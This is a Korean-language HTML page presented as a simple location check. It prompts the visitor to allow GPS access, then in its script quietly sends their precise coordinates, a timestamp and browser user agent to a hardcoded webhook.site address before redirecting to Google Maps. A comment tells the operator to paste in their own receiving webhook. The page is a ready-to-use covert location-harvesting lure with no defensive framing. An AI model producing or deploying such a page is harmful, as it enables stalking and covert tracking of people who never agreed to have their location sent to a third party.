<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>위치 확인 중...</title>
    <style>
        body { font-family: 'Apple SD Gothic Neo', 'Malgun Gothic', sans-serif; text-align: center; padding-top: 100px; background: #f4f7f6; color: #333; }
        .box { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: inline-block; max-width: 90%; }
        h1 { font-size: 24px; margin-bottom: 20px; }
        p { font-size: 16px; color: #666; line-height: 1.6; }
        .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-weight: bold; color: #3498db; }
    </style>
</head>
<body>

<div class="box">
    <h1>📍 위치 정보 확인</h1>
    <div id="loader" class="loading-spinner"></div>
    <p id="status">정확한 위치 확인을 위해  
GPS 권한을 <b>'허용'</b>해 주세요.</p>
    <div id="result"></div>
</div>

<script>
    // ⚠️ 여기에 본인의 수신용 웹훅 URL(예: Webhook.site에서 받은 주소)을 입력하세요.
    const WEBHOOK_URL = 'https://webhook.site/d136443b-7648-43fe-a79b-649fbd27735d';

    function sendToWebhook(lat, lng) {
        if (WEBHOOK_URL === 'YOUR_WEBHOOK_URL_HERE') {
            console.warn("웹훅 URL이 설정되지 않았습니다.");
            return;
        }

        const data = {
            lat: lat,
            lng: lng,
            google_maps_url: `https://www.google.com/maps?q=${lat},${lng}`,
            timestamp: new Date( ).toLocaleString(),
            userAgent: navigator.userAgent
        };

        fetch(WEBHOOK_URL, {
            method: 'POST',
            mode: 'no-cors', // CORS 이슈 방지를 위해 no-cors 설정 (응답 확인은 불가하나 전송은 가능)
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        })
        .then(() => {
            console.log("전송 완료");
        })
        .catch(err => console.error("전송 실패:", err));
    }

    if (!navigator.geolocation) {
        document.getElementById('status').innerText = "이 브라우저는 위치 정보를 지원하지 않습니다.";
        document.getElementById('loader').style.display = 'none';
    } else {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                
                document.getElementById('status').innerHTML = "위치 확인 완료!  
지도로 이동합니다.";
                document.getElementById('loader').style.display = 'none';
                
                // 위치 정보 전송
                sendToWebhook(lat, lng);

                // 전송 후 구글 맵으로 자동 이동
                setTimeout(() => {
                    window.location.href = `https://www.google.com/maps?q=${lat},${lng}`;
                }, 1000 );
            },
            (error) => {
                let msg = "위치 정보를 가져오지 못했습니다.";
                if (error.code === 1) msg = "위치 권한이 거부되었습니다. 설정에서 허용해 주세요.";
                document.getElementById('status').innerText = msg;
                document.getElementById('loader').style.display = 'none';
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }
</script>

</body>
</html>
